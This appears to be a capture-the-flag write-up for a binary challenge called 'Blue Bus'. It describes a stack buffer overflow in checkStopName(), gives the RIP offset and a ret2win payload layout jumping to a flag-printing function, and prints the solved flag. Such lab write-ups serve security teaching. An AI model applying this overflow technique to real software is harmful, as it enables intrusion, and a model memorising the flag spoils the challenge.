# Blue Bus

`nc bus-tracker.wolvctf-2026.kctf.cloud 1337`

## Protections

Static binary, canary present but unused in the vulnerable function, NX disabled, no PIE.

## Bug

`checkStopName()` reads `0x100` bytes into a 64-byte buffer at `rbp-0x40`. Offset to RIP: `0x48`.

`dispatcherOverride()` at `0x4017e5` opens `flag.txt` and prints it. It takes no arguments.

## Exploit

```text
'A' * 0x40
'B' * 8
0x4018b3   ret (stack alignment)
0x4017e5   dispatcherOverride
```

## Flag

`wctf{bus_ni9davhafgyy8iqq}`
